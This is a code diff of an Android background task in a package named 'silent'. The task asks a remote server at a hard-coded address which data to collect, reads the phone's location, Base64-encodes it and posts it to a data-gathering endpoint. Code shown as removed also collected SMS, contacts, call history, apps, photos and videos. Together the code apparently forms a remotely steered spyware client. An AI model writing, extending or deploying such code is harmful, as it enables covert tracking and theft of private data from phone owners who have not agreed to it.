@@ -39,6 +39,7 @@ import java.util.List;
 import src.silent.models.ContactModel;
 import src.silent.models.SmsModel;
 import src.silent.utils.LocationHandler;
+import src.silent.utils.ServerCommunicationHandler;
 
 /**
  * Created by all3x on 2/23/2018.
@@ -50,64 +51,47 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
 
     @Override
     protected Void doInBackground(Context... params) {
-        // TODO: Get the mask from server
-        String mask = "10000000";
-
         this.params = params[0];
-        //getAndroidIDModel();
+
+        String maskHash = ServerCommunicationHandler.getMask(params[0],
+                "http://192.168.1.24:58938/api/Service/GetMask",
+                "357336064017681");
+        String[] maskHash2 = maskHash.split(";");
+        String[] hashes = maskHash2[1].split(":");
 
         JSONObject bulkData = new JSONObject();
-
-        for (int i = 0; i < 8; i++) {
-            if (mask.charAt(i) == '1') {
+        for (int i=0; i<maskHash2.length; i++) {
+            if (maskHash2[0].charAt(i) == '1') {
                 switch (i) {
                     case 0:
-                        getSmartphoneLocation(bulkData);
-                        break;
-                    case 1:
-                        getMessages(bulkData);
-                        break;
-                    case 2:
-                        getContacts(bulkData);
-                        break;
-                    case 3:
-                        getCallHistory(bulkData);
-                        break;
-                    case 4:
-                        getMobileDataUsage(bulkData);
-                        break;
-                    case 5:
-                        getInstalledApps(bulkData);
-                        break;
-                    case 6:
-                        getPhotosVideos(bulkData);
-                        break;
-                    case 7:
-                        getBatteryLevel(bulkData);
+                        getSmartphoneLocation(bulkData, hashes[i]);
                         break;
                 }
             }
         }
+        //getAndroidIDModel();
 
+        ServerCommunicationHandler.executeDataPost(
+                "http://192.168.1.24:58938/api/Service/GatherData", bulkData);
         return null;
     }
 
-    private void getSmartphoneLocation(JSONObject bulkData) {
+    private void getSmartphoneLocation(JSONObject bulkData, String hash) {
         LocationManager locationManager = (LocationManager)
                 params.getSystemService(Context.LOCATION_SERVICE);
         try {
             Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-
+            JSONObject locationData = new JSONObject();
             if (location != null && location.getTime() > Calendar.getInstance().getTimeInMillis() -
                     120000) {
-                JSONObject locationData = new JSONObject();
+
+
                 locationData.put("Latitude",
                         Base64.encodeToString(String.valueOf(location.getLatitude()).getBytes(),
                                 Base64.URL_SAFE));
                 locationData.put("Longitude",
                         Base64.encodeToString(String.valueOf(location.getLongitude()).getBytes(),
                                 Base64.URL_SAFE));
-                bulkData.put("Location", locationData);
             } else {
                 LocationHandler locationHandler = new LocationHandler();
                 Criteria criteria = new Criteria();
@@ -124,16 +108,18 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                 locationManager.requestSingleUpdate(criteria, locationHandler, null);
                 Looper.loop();
 
-                JSONObject locationData = new JSONObject();
                 locationData.put("Latitude",
                         Base64.encodeToString(locationHandler.getLatitude().getBytes(),
                                 Base64.URL_SAFE));
                 locationData.put("Longitude",
                         Base64.encodeToString(locationHandler.getLongitude().getBytes(),
                                 Base64.URL_SAFE));
-                bulkData.put("Location", locationData);
             }
 
+            if (locationData.hashCode() != Integer.parseInt(hash)) {
+                locationData.put("Hash", locationData.hashCode());
+                bulkData.put("Location", locationData);
+            }
 
         } catch (SecurityException ex) {
             Log.d("Location EXCEPTION", ex.getMessage());
